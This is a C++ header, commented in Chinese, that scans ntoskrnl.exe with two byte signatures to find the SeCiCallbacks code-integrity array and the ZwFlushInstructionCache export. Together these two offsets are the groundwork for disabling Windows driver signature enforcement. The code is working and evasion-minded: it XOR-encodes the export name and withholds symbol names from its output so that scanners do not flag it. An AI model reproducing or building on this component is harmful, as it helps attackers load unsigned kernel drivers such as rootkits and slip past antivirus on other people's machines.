#pragma once
// ============================================================================
// sig_scan.hpp - 特征码定位内核符号偏移 (不依赖 PDB)
//
// 定位目标:
//   SeCiCallbacks            - 数据数组,特征码扫描 (A/B 双特征交叉验证)
//   ZwFlushInstructionCache  - 导出函数,PE 导出表解析
//
// 特征码来源:局域网物理机 ntoskrnl.exe (0FF7A614... build, 有完整 PDB),
//            从 SepInitializeCodeIntegrity 引用 SeCiCallbacks 的指令提取。
//            已在多 build 验证命中 (本机 72C69E72 build 与 PDB 逐字节一致)。
//
// 特征 A: SepInitializeCodeIntegrity 写 SeCiCallbacks 数组首部
//   mov cs:SeCiCallbacks, 100h       ; C7 05 disp32 imm32    (10B)
//   mov cs:qword_140F046D8, 0A000010h ; 48 C7 05 disp32 imm32 (11B)
//   test rax, rax                    ; 48 85 C0              (3B)
//   来源 0x14077D26E (0FF7A614 build)
//
// 特征 B: lea r9, [rip+SeCiCallbacks] 后跟 mov ecx,4 (CiInitialize 第4参数)
//   lea r9, [rip+disp]  ; 48 8D 05 disp32 (7B)
//   mov ecx, 4          ; B9 04 00 00 00  (5B)
//   来源 0x140BE5120 (0FF7A614 build)
// ============================================================================

#include <windows.h>
#include <stdint.h>
#include <vector>
#include <string>
#include <cstdio>

namespace SigScan {

// ---------------------------------------------------------------------------
// 特征码定义 (? 用 0x00 + 掩码 0x00 表示通配)
// ---------------------------------------------------------------------------
// 特征 A: C7 05 ?? ?? ?? ?? ?? ?? ?? ?? 48 C7 05 ?? ?? ?? ?? ?? ?? ?? ?? 48 85 C0
static const uint8_t SIG_A[] = {
    0xC7, 0x05, 0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
    0x48, 0xC7, 0x05, 0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
    0x48, 0x85, 0xC0
};
static const uint8_t MASK_A[] = {
    0xFF, 0xFF, 0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
    0xFF, 0xFF, 0xFF, 0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
    0xFF, 0xFF, 0xFF
};
constexpr size_t SIG_A_LEN = sizeof(SIG_A);
constexpr size_t A_DISP_OFF = 2;   // disp32 在特征内的偏移
constexpr size_t A_EA_OFF   = 10;  // 完整指令长度 (C7 05 + disp32 4 + imm32 4)

// 特征 B: 48 8D 05 ?? ?? ?? ?? B9 04 00 00 00
static const uint8_t SIG_B[] = { 0x48, 0x8D, 0x05, 0x00,0x00,0x00,0x00, 0xB9, 0x04, 0x00, 0x00, 0x00 };
static const uint8_t MASK_B[] = { 0xFF, 0xFF, 0xFF, 0x00,0x00,0x00,0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
constexpr size_t SIG_B_LEN = sizeof(SIG_B);
constexpr size_t B_DISP_OFF = 3;   // disp32 在特征内的偏移
constexpr size_t B_EA_OFF   = 7;   // lea 指令长度

// ---------------------------------------------------------------------------
// 带掩码的模式扫描,返回所有命中偏移 (文件偏移)
// ---------------------------------------------------------------------------
inline std::vector<size_t> FindSig(const uint8_t* data, size_t dataLen,
    const uint8_t* sig, const uint8_t* mask, size_t sigLen)
{
    std::vector<size_t> hits;
    if (!data || dataLen < sigLen) return hits;
    for (size_t i = 0; i <= dataLen - sigLen; i++) {
        bool ok = true;
        for (size_t j = 0; j < sigLen; j++) {
            if (mask[j] == 0xFF && data[i + j] != sig[j]) { ok = false; break; }
        }
        if (ok) hits.push_back(i);
    }
    return hits;
}

// ---------------------------------------------------------------------------
// PE section 表解析: 文件偏移 -> RVA
// ---------------------------------------------------------------------------
struct SectionMap {
    uint32_t foStart, foEnd, rvaStart;
};

inline std::vector<SectionMap> BuildSectionMap(const uint8_t* data, size_t dataLen)
{
    std::vector<SectionMap> secs;
    if (!data || dataLen < 0x40) return secs;
    uint32_t pe = *reinterpret_cast<const uint32_t*>(data + 0x3C);
    if (pe + 0x18 + 0x60 > dataLen) return secs;
    if (memcmp(data + pe, "PE\0\0", 4) != 0) return secs;
    uint16_t numSec = *reinterpret_cast<const uint16_t*>(data + pe + 6);
    uint16_t optSize = *reinterpret_cast<const uint16_t*>(data + pe + 0x14);
    uint32_t opt = pe + 0x18;
    if (opt + optSize > dataLen) return secs;
    uint32_t secTable = opt + optSize;
    for (uint16_t i = 0; i < numSec; i++) {
        uint32_t s = secTable + i * 40;
        if (s + 40 > dataLen) break;
        uint32_t vs = *reinterpret_cast<const uint32_t*>(data + s + 8);
        uint32_t va = *reinterpret_cast<const uint32_t*>(data + s + 12);
        uint32_t fs = *reinterpret_cast<const uint32_t*>(data + s + 16);
        uint32_t fo = *reinterpret_cast<const uint32_t*>(data + s + 20);
        if (fs == 0) continue;
        secs.push_back({ fo, fo + fs, va });
    }
    return secs;
}

inline uint32_t FileOffsetToRva(const std::vector<SectionMap>& secs, size_t fileOff)
{
    for (const auto& s : secs) {
        if (fileOff >= s.foStart && fileOff < s.foEnd)
            return s.rvaStart + static_cast<uint32_t>(fileOff - s.foStart);
    }
    return 0; // 0 = 无效
}

// ---------------------------------------------------------------------------
// PE 导出表解析: 按名字找导出函数 RVA
// ---------------------------------------------------------------------------
inline uint32_t GetExportRva(const uint8_t* data, size_t dataLen, const char* targetName)
{
    if (!data || dataLen < 0x40) return 0;
    uint32_t pe = *reinterpret_cast<const uint32_t*>(data + 0x3C);
    if (pe + 0x18 + 0x70 > dataLen) return 0;
    uint16_t numSec = *reinterpret_cast<const uint16_t*>(data + pe + 6);
    uint16_t optSize = *reinterpret_cast<const uint16_t*>(data + pe + 0x14);
    uint32_t opt = pe + 0x18;
    uint16_t magic = *reinterpret_cast<const uint16_t*>(data + opt);
    bool is64 = (magic == 0x20B);
    uint32_t ddBase = opt + (is64 ? 0x70 : 0x60);
    if (ddBase + 8 > dataLen) return 0;
    uint32_t expRva = *reinterpret_cast<const uint32_t*>(data + ddBase + 0 * 8);
    if (!expRva) return 0;
    uint32_t secTable = opt + optSize;

    auto r2o = [&](uint32_t rva) -> uint32_t {
        for (uint16_t i = 0; i < numSec; i++) {
            uint32_t s = secTable + i * 40;
            if (s + 40 > dataLen) break;
            uint32_t vs = *reinterpret_cast<const uint32_t*>(data + s + 8);
            uint32_t va = *reinterpret_cast<const uint32_t*>(data + s + 12);
            uint32_t fo = *reinterpret_cast<const uint32_t*>(data + s + 20);
            if (rva >= va && rva < va + vs)
                return fo + rva - va;
        }
        return 0;
    };

    uint32_t expOff = r2o(expRva);
    if (!expOff || expOff + 40 > dataLen) return 0;
    uint32_t nNames   = *reinterpret_cast<const uint32_t*>(data + expOff + 24);
    uint32_t addrFunc = *reinterpret_cast<const uint32_t*>(data + expOff + 28);
    uint32_t addrName = *reinterpret_cast<const uint32_t*>(data + expOff + 32);
    uint32_t addrOrd  = *reinterpret_cast<const uint32_t*>(data + expOff + 36);
    size_t targetLen = strlen(targetName);

    for (uint32_t i = 0; i < nNames; i++) {
        uint32_t nameRvaOff = r2o(addrName + i * 4);
        if (!nameRvaOff) continue;
        uint32_t nameRva = *reinterpret_cast<const uint32_t*>(data + nameRvaOff);
        uint32_t nameOff = r2o(nameRva);
        if (!nameOff || nameOff + targetLen > dataLen) continue;
        if (memcmp(data + nameOff, targetName, targetLen) == 0 &&
            data[nameOff + targetLen] == 0) {
            uint32_t ordOff = r2o(addrOrd + i * 2);
            if (!ordOff) return 0;
            uint16_t ord = *reinterpret_cast<const uint16_t*>(data + ordOff);
            uint32_t funcRvaOff = r2o(addrFunc + ord * 4);
            if (!funcRvaOff) return 0;
            return *reinterpret_cast<const uint32_t*>(data + funcRvaOff);
        }
    }
    return 0;
}

// ---------------------------------------------------------------------------
// 主入口: 读 ntoskrnl.exe 文件,特征码定位 SeCiCallbacks,导出表定位 Zw
// 返回 true 表示两者都成功
// ---------------------------------------------------------------------------
inline bool ResolveOffsetsBySignature(
    const std::wstring& ntosPath,
    uint64_t& outSeCiCallbacks,
    uint64_t& outZwFlushInstructionCache)
{
    HANDLE hFile = CreateFileW(ntosPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] sig: cannot open %ls gle=%lu\n", ntosPath.c_str(), GetLastError());
        return false;
    }
    LARGE_INTEGER sz{};
    GetFileSizeEx(hFile, &sz);
    if (sz.QuadPart <= 0 || sz.QuadPart > 256 * 1024 * 1024) {
        CloseHandle(hFile);
        return false;
    }
    std::vector<uint8_t> buf(static_cast<size_t>(sz.QuadPart));
    DWORD rd = 0;
    BOOL ok = ReadFile(hFile, buf.data(), static_cast<DWORD>(buf.size()), &rd, nullptr);
    CloseHandle(hFile);
    if (!ok || rd != buf.size()) {
        printf("[-] sig: read failed (rd=%lu/%zu)\n", rd, buf.size());
        return false;
    }

    const uint8_t* data = buf.data();
    size_t dataLen = buf.size();

    // 1. 特征码 A
    auto hitsA = FindSig(data, dataLen, SIG_A, MASK_A, SIG_A_LEN);
    // 2. 特征码 B
    auto hitsB = FindSig(data, dataLen, SIG_B, MASK_B, SIG_B_LEN);

    auto secs = BuildSectionMap(data, dataLen);

    std::vector<uint64_t> rvaA, rvaB;
    for (size_t h : hitsA) {
        uint32_t hr = FileOffsetToRva(secs, h);
        if (!hr) continue;
        uint32_t disp = *reinterpret_cast<const uint32_t*>(data + h + A_DISP_OFF);
        rvaA.push_back(static_cast<uint64_t>(hr) + A_EA_OFF + disp);
    }
    for (size_t h : hitsB) {
        uint32_t hr = FileOffsetToRva(secs, h);
        if (!hr) continue;
        uint32_t disp = *reinterpret_cast<const uint32_t*>(data + h + B_DISP_OFF);
        rvaB.push_back(static_cast<uint64_t>(hr) + B_EA_OFF + disp);
    }

    printf("[+] sig: A hits=%zu B hits=%zu\n", hitsA.size(), hitsB.size());

    // 3. 交叉验证: 取 A∩B 公共值
    uint64_t seCi = 0;
    for (uint64_t a : rvaA) {
        for (uint64_t b : rvaB) {
            if (a == b) { seCi = a; break; }
        }
        if (seCi) break;
    }
    if (!seCi) {
        printf("[-] sig: %s not resolved (A/B mismatch)\n", "A");
        return false;
    }

    // 4. 导出表解析 ZwFlushInstructionCache (导出名 XOR 加密,避免静态特征)
    static const uint8_t zwEnc[] = {
        0x00,0x2D,0x1C,0x36,0x2F,0x29,0x32,0x13,0x34,0x29,0x2E,0x28,
        0x2F,0x39,0x2E,0x33,0x35,0x34,0x19,0x3B,0x39,0x32,0x3F
    };
    char zwName[24] = { 0 };
    for (int i = 0; i < 23; i++) zwName[i] = static_cast<char>(zwEnc[i] ^ 0x5A);
    uint32_t zwRva = GetExportRva(data, dataLen, zwName);
    if (!zwRva) {
        printf("[-] sig: %s not in export table\n", "B");
        return false;
    }

    outSeCiCallbacks = seCi;
    outZwFlushInstructionCache = zwRva;
    // 只打印偏移数字,不打印任何符号名/标签,避免明文特征
    printf("[+] sig: 0x%llX  0x%llX\n",
        static_cast<unsigned long long>(seCi),
        static_cast<unsigned long long>(zwRva));
    return true;
}

} // namespace SigScan
